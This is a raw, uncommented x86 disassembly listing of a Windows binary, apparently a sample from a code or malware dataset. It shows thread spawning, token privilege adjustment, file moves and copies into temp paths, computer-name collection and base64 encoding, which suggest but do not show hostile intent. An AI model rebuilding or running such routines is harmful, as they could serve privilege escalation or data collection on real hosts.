push ebp
xor ebp ebp
test eax eax
jle r-xdata
xor al al
jmp r-xdata
mov al 0x1
pop ebp
push ebx
push esi
mov esi rw-data
lea ebx [ edi + 0x51c ]
pop ecx
pop ecx
retn
push 0xc8
call [ Sleep@IAT ]
inc ebp
add esi 0xc
add ebx 0x14
cmp ebp [ edi + 0x78c ]
jl r-xdata
cmp [ ebx - 0x4 ] 0x0
jne r-xdata
xor eax eax
lea ecx [ esp + 0x10 ]
push ecx
push eax
push esi
push sub_40eb6f
push 0x10000
push eax
mov [ esi ] edi
mov [ esi + 0x4 ] ebp
mov [ esi + 0x8 ] eax
call [ CreateThread@IAT ]
push 0x0
mov [ esp + 0x10 ] eax
call [ Sleep@IAT ]
cmp [ esp + 0xc ] 0xffffffff
je r-xdata
pop esi
pop ebx
mov eax [ esi + 0x8 ]
push [ esp + 0xc ]
add [ ebx ] eax
call [ CloseHandle@IAT ]
push 0xffffffff
push [ esp + 0x10 ]
call [ WaitForSingleObject@IAT ]
sub_40f394
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
push esi
cmp [ edi + 0x2b78 ] ebx
jle r-xdata
pop esi
mov al 0x1
pop ebx
leave
retn
mov esi [ Sleep@IAT ]
lea eax [ edi + 0x988 ]
mov [ ebp - 0x8 ] eax
push 0xc8
call esi
add [ ebp - 0x8 ] 0x118
inc ebx
cmp ebx [ edi + 0x2b78 ]
jl r-xdata
push 0xffffffff
push [ ebp - 0x4 ]
call [ WaitForSingleObject@IAT ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
push [ ebp - 0x4 ]
add [ eax ] ecx
call [ CloseHandle@IAT ]
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push sub_40ebc4
push 0x10000
push 0x0
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] ebx
call [ CreateThread@IAT ]
push 0x0
mov [ ebp - 0x4 ] eax
call esi
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
sub_40f41d
sub esp 0xc
and [ esp ] 0x0
cmp [ ebx + 0x4e7c ] 0x0
jle r-xdata
mov al 0x1
add esp 0xc
retn
push ebp
mov ebp [ Sleep@IAT ]
push esi
push edi
mov esi rw-data
lea edi [ ebx + 0x2c8c ]
push 0x1f4
call ebp
inc [ esp + 0xc ]
mov eax [ esp + 0xc ]
add edi 0x118
add esi 0x10
cmp eax [ ebx + 0x4e7c ]
jl r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
mov ecx [ edi - 0x110 ]
lea eax [ esi - 0x8 ]
mov [ eax ] ecx
mov [ esi - 0x4 ] ebx
mov [ esi ] edi
mov cl [ edi + 0x4 ]
mov [ esi + 0x4 ] cl
lea ecx [ esp + 0x14 ]
push ecx
push 0x0
push eax
push sub_40ec73
push 0x10000
push 0x0
call [ CreateThread@IAT ]
push 0x0
mov [ esp + 0x14 ] eax
call ebp
cmp [ esp + 0x10 ] 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
sub_40f4b7
push ecx
call sub_412ae3
cmp eax 0x3
jl r-xdata
xor al al
pop ecx
retn
lea eax [ esp ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov al 0x1
pop ecx
retn
sub_40f4e1
mov eax sub_41aa49
call sub_416a8c
sub esp 0x2c
push ebx
push esi
lea esi [ ebp - 0x34 ]
mov ebx ecx
mov [ ebp - 0x14 ] 0x0
call sub_40c9fb
and [ ebp - 0x4 ] 0x0
xor cl cl
xor dl dl
mov [ ebp - 0x23 ] 0x0
test edi edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x34 ]
call sub_40c938
xor al al
cmp ebx 0x1
jle r-xdata
test bl 0x1
je r-xdata
and [ ebp - 0x18 ] 0x0
test ebx ebx
jg r-xdata
xor bl bl
mov eax [ ebp - 0x18 ]
mov al [ eax + edi ]
cmp al 0x20
jae r-xdata
push 0x0
lea eax [ ebx + ebx + 0x2 ]
push eax
lea esi [ ebp - 0x34 ]
call sub_40c865
lea eax [ ebx + 0x1 ]
push eax
push [ ebp - 0x34 ]
push ebx
push edi
push 0x8
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jle r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp al 0xfd
jbe r-xdata
test al al
jne r-xdata
mov [ ebp - 0x14 ] 0x1
call [ GetLastError@IAT ]
cmp eax 0x459
jne r-xdata
and [ ebp - 0x1c ] 0x0
inc [ ebp - 0x1c ]
cmp [ ebp - 0x1c ] 0x1
jg r-xdata
mov bl 0x1
jmp r-xdata
lea esi [ ebx - 0x1 ]
cmp [ ebp - 0x18 ] esi
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x34 ]
call sub_40c938
mov al [ ebp - 0x14 ]
jmp r-xdata
inc [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] ebx
jl r-xdata
cmp cl [ ebp - 0x20 ]
jne r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x34 ]
call sub_40c938
mov al bl
jmp r-xdata
mov dl [ ebp - 0x21 ]
jmp r-xdata
cmp cl 0x35
jb r-xdata
mov [ ebp - 0x20 ] dl
mov dl [ ebp - 0x22 ]
mov [ ebp - 0x21 ] dl
mov dl [ ebp - 0x23 ]
mov [ ebp - 0x23 ] cl
mov cl al
mov [ ebp - 0x22 ] dl
cmp cl dl
jne r-xdata
cmp cl 0x4e
jb r-xdata
cmp cl 0x4a
jbe r-xdata
cmp cl 0xad
jb r-xdata
cmp cl 0x9e
jbe r-xdata
cmp cl 0xe0
jb r-xdata
cmp cl 0xd6
jbe r-xdata
cmp cl 0xf8
jbe r-xdata
sub_40f647
push ecx
push ebx
push edi
mov edi eax
test edi edi
je r-xdata
xor eax eax
test esi esi
jle r-xdata
mov ecx esi
call sub_40f4e1
test al al
je r-xdata
lea eax [ esi + esi + 0x10 ]
call sub_412da8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_412da8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
push eax
push ebx
push esi
push edi
push 0x8
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jle r-xdata
push esi
push edi
push ebx
call sub_406530
add esp 0xc
pop edi
pop ebx
pop ecx
retn
push ebx
call sub_412d05
xor ebx ebx
call [ GetLastError@IAT ]
cmp eax 0x459
jne r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
jmp r-xdata
sub_40f6c2
mov eax sub_41aaf8
call sub_416a8c
sub esp 0x25c
push ebx
push esi
push edi
lea eax [ ebp - 0x5c ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
call sub_412634
mov [ ebp - 0x4 ] ebx
lea esi [ ebp - 0x38 ]
call sub_40c9fb
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x28 ]
call sub_40c9fb
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0xff00aaee
mov [ ebp - 0xd ] bl
call sub_4130d5
test al al
je r-xdata
mov al [ ebp - 0xd ]
mov [ ebp + 0xb ] al
jmp r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x28 ]
call sub_40c938
mov [ ebp - 0x4 ] bl
lea esi [ ebp - 0x38 ]
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x5c ]
push eax
call sub_4125f1
mov ecx [ ebp - 0xc ]
mov al [ ebp + 0xb ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov [ ebp + 0xb ] bl
mov edi [ ebp - 0x18 ]
cmp edi ebx
jbe r-xdata
push ebx
push edi
lea esi [ ebp - 0x38 ]
call sub_40c865
push [ ebp - 0x14 ]
mov eax esi
call sub_40cb2c
lea eax [ ebp - 0x5c ]
push eax
mov eax esi
call sub_412706
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x5c ]
call sub_4126c1
cmp [ ebp - 0x24 ] ebx
jle r-xdata
push [ ebp - 0x14 ]
call sub_412d05
push 0x3
lea eax [ ebp - 0x268 ]
push eax
call sub_40ed67
mov esi r--data
push esi
lea eax [ ebp - 0x268 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x268 ]
push eax
call sub_40d8aa
mov edi eax
cmp edi ebx
je r-xdata
push [ ebp - 0x24 ]
mov ecx edi
push [ ebp - 0x28 ]
call sub_40ddc7
test al al
je r-xdata
call sub_4102c5
push eax
lea eax [ ebp - 0x268 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x268 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x268 ]
push eax
call sub_4102c5
push eax
call [ MoveFileW@IAT ]
test eax eax
je r-xdata
push 0x1
push esi
push edi
call sub_40dbf0
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
push edi
call sub_412d05
push ebx
call sub_4102c5
push eax
push edi
call [ CopyFileW@IAT ]
lea eax [ ebp - 0x268 ]
push eax
call sub_4102e6
push ebx
push eax
xor esi esi
call sub_40ea0e
test al al
je r-xdata
push [ ebp + 0x8 ]
call sub_412d05
mov [ ebp - 0xd ] 0x1
sub_40f884
mov eax sub_41ab14
call sub_416a8c
sub esp 0x44
push ebx
push esi
push edi
lea eax [ ebp - 0x4c ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_412634
mov [ ebp - 0x4 ] ebx
lea esi [ ebp - 0x28 ]
call sub_40c9fb
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0xff00bb00
mov [ ebp - 0xd ] bl
call sub_4130d5
test al al
je r-xdata
mov al [ ebp - 0xd ]
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ ebp - 0x4 ] bl
lea esi [ ebp - 0x28 ]
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x4c ]
push eax
call sub_4125f1
mov ecx [ ebp - 0xc ]
mov al [ ebp + 0xb ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov [ ebp + 0xb ] bl
mov edi [ ebp - 0x14 ]
cmp edi ebx
jbe r-xdata
push ebx
push edi
call sub_40c865
push [ ebp + 0x8 ]
mov eax esi
call sub_40cb2c
lea eax [ ebp - 0x4c ]
push eax
mov eax esi
call sub_412706
lea eax [ ebp + 0x8 ]
push eax
lea edi [ ebp - 0x14 ]
lea esi [ ebp - 0x4c ]
mov [ ebp + 0x8 ] 0x5b61360
call sub_412589
push r--data
push [ ebp - 0x14 ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
mov [ ebp + 0xb ] al
jmp r-xdata
sub_40f960
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ac8d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
lea esi [ esp + 0x10 ]
mov ebx ecx
call sub_40c9fb
xor esi esi
mov [ esp + 0x2c ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
lea eax [ esp + 0xc ]
push eax
push 0x4
pop edi
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] 0x77010101
call sub_40cb2c
push [ ebp + 0xc ]
lea eax [ esp + 0x14 ]
push eax
call sub_40ccf8
push [ ebp + 0x18 ]
lea eax [ esp + 0x14 ]
push eax
call sub_40ccf8
push [ ebp + 0x1c ]
lea eax [ esp + 0x14 ]
push eax
call sub_40ccf8
push [ ebp + 0x10 ]
lea eax [ esp + 0x14 ]
push eax
call sub_40ccf8
push [ ebp + 0x14 ]
lea eax [ esp + 0x14 ]
push eax
call sub_40ccf8
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] esi
call sub_40cb2c
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] esi
call sub_40cb2c
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] esi
call sub_40cb2c
call [ GetACP@IAT ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_40cce2
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] 0x3
call sub_40cb2c
push [ ebx + 0x4 ]
lea eax [ esp + 0x14 ]
push eax
call sub_40cce2
mov edi [ ebx + 0x4 ]
cmp edi esi
jle r-xdata
cmp [ ebp + 0x14 ] esi
jne r-xdata
push [ ebp + 0x20 ]
lea eax [ esp + 0x14 ]
push eax
call sub_40ccf8
push [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
push eax
call sub_40cccc
push [ esp + 0x14 ]
push esi
push 0x64
call sub_40ed22
push eax
push esi
mov esi [ ebp + 0x8 ]
push 0xff0f8211
push [ esp + 0x2c ]
push [ esp + 0x2c ]
call sub_40ffc9
test al al
je r-xdata
push [ ebx ]
lea eax [ esp + 0x14 ]
call sub_40cb2c
cmp ebx esi
jne r-xdata
xor bl bl
mov bl 0x1
jmp r-xdata
or [ esp + 0x2c ] 0xffffffff
lea esi [ esp + 0x10 ]
call sub_40c938
mov ecx [ esp + 0x24 ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x1c
sub_40fae9
push ebp
mov ebp esp
sub esp 0x1c
lea eax [ ebp - 0x8 ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x18 ] 0x1
push 0x0
mov [ ebp - 0xc ] 0x2
call [ LookupPrivilegeValueW@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
mov al 0x1
push 0x0
push 0x0
push 0x10
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push [ ebp - 0x8 ]
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
leave
retn 0x4
call [ GetLastError@IAT ]
sub_40fb59
push ebx
push esi
xor esi esi
mov al 0x1
sub edx rw-data
xor al al
inc esi
cmp esi 0x10
jl r-xdata
mov bl [ edx + esi + rw-data ]
cmp bl [ esi + rw-data ]
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
sub_40fb81
mov eax [ rw-data ]
mov ecx [ edx + 0x24 ]
push esi
push edi
lea esi [ eax + 0x8 ]
mov edi [ esi ]
lea edi [ edi + ecx + 0x6b ]
cmp edi 0x186a0
jle r-xdata
mov edi [ eax + 0x4 ]
mov [ edx + 0x14 ] edi
mov edi [ esi ]
push ebx
lea ebx [ edi + eax + 0x1c ]
lea edi [ ecx + 0x3a ]
push edi
push edx
push ebx
call sub_401f50
add [ esi ] edi
push 0x10
push rw-data
add ebx edi
push ebx
call sub_401f50
add esp 0x18
add [ esi ] 0x10
mov al 0x1
pop ebx
xor al al
jmp r-xdata
pop edi
pop esi
retn
sub_40fbd5
mov eax sub_41a9a6
call sub_416a8c
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40eb63
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x8 ]
imul ecx ecx 0x14
push [ esi + 0xc ]
push [ esi + 0x4 ]
push eax
call [ ecx + eax ]
add esp 0xc
mov [ esi + 0x10 ] al
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_40fc32
mov eax [ rw-data ]
push esi
mov esi eax
mov ecx 0x186a0
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push 0x10
lea eax [ esi + 0xc ]
push rw-data
push eax
call sub_401f50
and [ esi + 0x8 ] 0x0
add esp 0xc
pop esi
retn
sub_40fc5f
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ edi ]
sub eax 0x10
push ebx
xor ecx ecx
push esi
test eax eax
jle r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
mov eax [ edi ]
inc ecx
sub eax 0x10
inc ebx
cmp ecx eax
jl r-xdata
mov edx ebx
call sub_40fb59
test al al
je r-xdata
mov al [ ebx ]
cmp al [ rw-data ]
jne r-xdata
mov esi [ ebx + 0x34 ]
mov eax [ ebp + 0x8 ]
add ebx 0x10
add ecx 0x10
add esi 0x32
lea eax [ ecx + eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
cmp esi [ edi ]
jg r-xdata
call sub_40f29b
xor eax eax
cmp [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebx + 0x24 ]
cmp ecx [ edi ]
jae r-xdata
push esi
push [ ebp - 0x4 ]
call sub_4100a9
mov ecx [ ebp - 0x8 ]
cmp eax [ ebx ]
je r-xdata
push 0xffffffe8
pop eax
sub eax esi
add [ edi ] eax
mov eax ebx
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_40fce5
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push esi
lea esi [ eax + 0x8 ]
mov ecx [ esi ]
push edi
mov [ ebp - 0x4 ] eax
test ecx ecx
je r-xdata
mov edi [ esi ]
lea ebx [ eax + 0x4 ]
add edi 0x18
call sub_40f29b
test ebx ebx
je r-xdata
add ecx 0xfffffff0
mov [ esi ] ecx
xor eax eax
push edi
push ebx
call sub_4100a9
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ ebp - 0x8 ] eax
push 0x4
lea eax [ ebp - 0x8 ]
push eax
mov eax [ esi ]
lea eax [ ecx + eax + 0x1c ]
push eax
call sub_401f50
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
sub_40fd41
push esi
call sub_40f29b
mov eax 0x188a0
call sub_412da8
mov esi eax
test esi esi
jne r-xdata
inc [ rw-data ]
mov eax [ rw-data ]
push 0x10
mov [ esi + 0x4 ] eax
lea eax [ esi + 0xc ]
push rw-data
push eax
mov [ esi ] 0xdeadface
call sub_401f50
add esp 0xc
mov eax esi
pop esi
retn
pop esi
retn
sub_40fd84
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
push ebx
push esi
push edi
call sub_40eb63
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ esp + 0x14 ] edi
push 0x1388
call [ Sleep@IAT ]
cmp [ rw-data ] edi
je r-xdata
mov esi rw-data
push esi
call sub_40ce2a
test al al
je r-xdata
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
mov [ ebx + 0x5770 ] edi
jmp r-xdata
push esi
call sub_40ce0a
push 0x1
call [ ExitThread@IAT ]
int3
mov [ esp + 0x13 ] 0x0
call sub_40e9bf
sub eax [ ebx + 0x5770 ]
cmp eax 0x78
jbe r-xdata
mov esi [ rw-data ]
shr esi 0x2
push 0x1c
xor edx edx
pop ecx
cmp esi edi
jle r-xdata
mov [ esp + 0x13 ] 0x1
add ecx 0x4
lea edi [ edx - 0x1 ]
cmp ecx 0x124f8
jbe r-xdata
mov eax [ rw-data ]
mov eax [ eax + edx * 4 ]
mov eax [ eax + 0x24 ]
lea edi [ eax + ecx + 0x4f ]
cmp edi 0x186a0
ja r-xdata
cmp esi 0x5dc
jle r-xdata
mov [ esp + 0x13 ] 0x1
inc edx
lea ecx [ eax + ecx + 0x4b ]
cmp edx esi
jl r-xdata
cmp [ esp + 0x13 ] 0x0
je r-xdata
mov [ esp + 0x13 ] 0x1
push rw-data
call sub_40ce0a
cmp [ esp + 0x13 ] 0x0
je r-xdata
call sub_40fc32
xor esi esi
test edi edi
js r-xdata
mov esi [ rw-data ]
mov eax [ esi + 0x8 ]
add eax 0x20
push eax
push esi
mov [ esp + 0x24 ] eax
call sub_413461
mov edi [ esp + 0x14 ]
call sub_40fce5
mov eax [ rw-data ]
mov edx [ eax + esi * 4 ]
call sub_40fb81
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
or [ eax + 0x34 ] 0x1
inc esi
cmp esi edi
jle r-xdata
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
mov eax [ esp + 0x1c ]
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x20 ]
push eax
push ecx
lea eax [ esp + 0x2c ]
push eax
push sub_40fbd5
push 0x10000
push ecx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x44 ] edi
mov [ esp + 0x40 ] esi
mov [ esp + 0x4c ] cl
call [ CreateThread@IAT ]
mov [ esp + 0x18 ] eax
cmp eax 0xffffffff
je r-xdata
cmp [ esp + 0x34 ] 0x0
jne r-xdata
mov esi edi
imul esi esi 0x14
push [ esi + ebx + 0xc ]
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0xffffffff
je r-xdata
mov [ esp + 0x14 ] edi
call sub_40e9bf
and [ ebx + 0x58b4 ] 0x0
mov edi rw-data
mov [ ebx + 0x5770 ] eax
call sub_40c7e9
jmp r-xdata
lea eax [ edi + 0x1 ]
xor edx edx
div [ ebx + 0x280 ]
mov edi edx
cmp edi [ esp + 0x14 ]
je r-xdata
inc [ esi + ebx + 0x10 ]
push 0x0
push [ esp + 0x1c ]
call [ TerminateThread@IAT ]
cmp eax 0x102
jne r-xdata
inc [ ebx + 0x58b4 ]
mov eax [ rw-data ]
shr eax 0x2
xor ecx ecx
test eax eax
jle r-xdata
mov esi [ rw-data ]
jmp r-xdata
push [ esp + 0x18 ]
call [ CloseHandle@IAT ]
push 0x1d4c0
call [ Sleep@IAT ]
mov eax [ rw-data ]
mov eax [ eax + ecx * 4 ]
and [ eax + 0x34 ] 0xfe
mov eax [ rw-data ]
inc ecx
shr eax 0x2
cmp ecx eax
jl r-xdata
push 0x14
pop ecx
lea eax [ esp + 0x24 ]
sub_40ffc9
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
push edi
cmp [ esi + 0x280 ] ebx
je r-xdata
xor al al
cmp [ ebp + 0x8 ] ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
jle r-xdata
push [ ebp + 0x1c ]
call sub_40c79e
cmp eax 0x12c
jg r-xdata
cmp [ esi + 0x5770 ] ebx
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40cd70
test al al
je r-xdata
call sub_40e9bf
mov [ esi + 0x5770 ] eax
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x576c ]
mov [ ebp - 0x4 ] ebx
call [ GetExitCodeThread@IAT ]
mov eax [ esi + 0x576c ]
cmp eax 0xffffffff
je r-xdata
call sub_40fd41
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push esi
push sub_40fd84
push 0x10000
push ebx
call [ CreateThread@IAT ]
mov [ esi + 0x576c ] eax
cmp [ ebp - 0x4 ] 0x103
je r-xdata
pop edi
pop ebx
leave
retn 0x20
mov al 0x1
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_4100a9
xor ecx ecx
or eax 0xffffffff
cmp [ esp + 0x8 ] ecx
ja r-xdata
mov edx [ esp + 0x4 ]
movzx edx [ ecx + edx ]
xor edx eax
and edx 0xff
shr eax 0x8
xor eax [ edx * 4 + rw-data ]
inc ecx
cmp ecx [ esp + 0x8 ]
jb r-xdata
xor eax eax
jmp r-xdata
retn 0x8
sub_4100dc
mov ecx [ eax + 0x4 ]
push esi
mov esi [ eax ]
shr ecx 0x2
mov eax ecx
cdq
push edi
sub eax edx
xor edi edi
sar eax 0x1
pop edi
pop esi
retn 0x4
jae r-xdata
lea edi [ eax + 0x1 ]
mov ecx eax
jmp r-xdata
mov edx [ esi + eax * 4 ]
cmp [ esp + 0xc ] edx
je r-xdata
mov eax ecx
sub eax edi
cdq
sub eax edx
sar eax 0x1
add eax edi
cmp edi ecx
jl r-xdata
sub_410115
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi eax
mov esi [ edi + 0x4 ]
push ebx
shr esi 0x2
call sub_4100dc
mov [ ebp - 0x4 ] eax
cmp eax esi
jge r-xdata
push ebx
push edi
call sub_40cce2
jmp r-xdata
mov ecx [ edi ]
cmp [ ecx + eax * 4 ] ebx
jne r-xdata
mov al 0x1
push 0x0
push edi
call sub_40cce2
mov eax [ ebp - 0x4 ]
mov edi [ edi ]
sub esi eax
lea edi [ edi + eax * 4 ]
shl esi 0x2
push esi
lea eax [ edi + 0x4 ]
push edi
push eax
call sub_401f50
add esp 0xc
mov [ edi ] ebx
xor al al
jmp r-xdata
pop edi
pop esi
leave
retn
sub_410170
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ eax + 0x4 ]
shr esi 0x2
push edi
mov edi [ eax ]
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ edi + eax * 4 ]
mov eax [ ebp + 0x8 ]
call sub_410115
test [ ebp - 0x4 ] 0xf
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jl r-xdata
mov ebx [ Sleep@IAT ]
push 0xa
call ebx
push 0x0
call ebx
sub_4101be
test edx edx
je r-xdata
xor al al
cmp [ eax ] 0x1
jbe r-xdata
cmp [ esp + 0x8 ] 0x1
jbe r-xdata
push eax
push [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
call sub_40ceb9
neg eax
pop ecx
sbb al al
pop ecx
inc al
jmp r-xdata
retn 0x8
sub_4101eb
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor al al
cmp [ eax ] 0x1
jbe r-xdata
cmp [ ebp + 0x10 ] 0x1
jbe r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40cf69
add esp 0x10
mov al 0x1
jmp r-xdata
pop ebp
retn 0xc
sub_41021b
push ebp
mov ebp esp
sub esp 0x228
and [ ebp - 0x8 ] 0x0
push esi
lea eax [ ebp - 0x224 ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
jle r-xdata
xor al al
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x224 ]
push eax
push [ ebp + 0x8 ]
call [ lstrcpynW@IAT ]
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
call [ UuidCreate@IAT ]
test eax eax
jne r-xdata
pop esi
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ UuidToStringW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x224 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x226 ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x224 ]
push eax
call esi
lea eax [ ebp - 0x8 ]
push eax
call [ RpcStringFreeW@IAT ]
push r--data
lea eax [ ebp - 0x224 ]
push eax
call esi
sub_41030a
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov esi rw-data
push esi
mov [ ebp - 0x4 ] 0x104
call [ GetComputerNameW@IAT ]
test eax eax
jne r-xdata
mov eax esi
pop esi
leave
retn
push r--data
push esi
call [ lstrcpyW@IAT ]
sub_41033b
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
push 0x3f
mov esi edx
pop ebx
cmp edi 0x3
jl r-xdata
test edi edi
jne r-xdata
push 0x3
pop ebx
xor edx edx
div ebx
push 0x3f
pop ebx
mov [ ebp - 0x4 ] eax
imul eax eax 0xfffffffd
add edi eax
movzx eax [ esi ]
shl eax 0x10
dec edi
mov [ ecx + 0x3 ] 0x3d
je r-xdata
mov [ ecx ] 0x0
jmp r-xdata
movzx edx [ esi ]
movzx eax [ esi + 0x1 ]
shl edx 0x8
or edx eax
movzx eax [ esi + 0x2 ]
shl edx 0x8
or edx eax
mov eax edx
shr eax 0x12
and eax ebx
mov al [ eax + r--data ]
mov [ ecx ] al
mov eax edx
shr eax 0xc
and eax ebx
mov al [ eax + r--data ]
mov [ ecx + 0x1 ] al
mov eax edx
shr eax 0x6
and eax ebx
mov al [ eax + r--data ]
and edx ebx
mov [ ecx + 0x2 ] al
mov al [ edx + r--data ]
mov [ ecx + 0x3 ] al
add esi 0x3
add ecx 0x4
dec [ ebp - 0x4 ]
jne r-xdata
mov [ ecx + 0x2 ] 0x3d
movzx edx [ esi + 0x1 ]
shl edx 0x8
or eax edx
mov edx eax
shr edx 0x6
and edx ebx
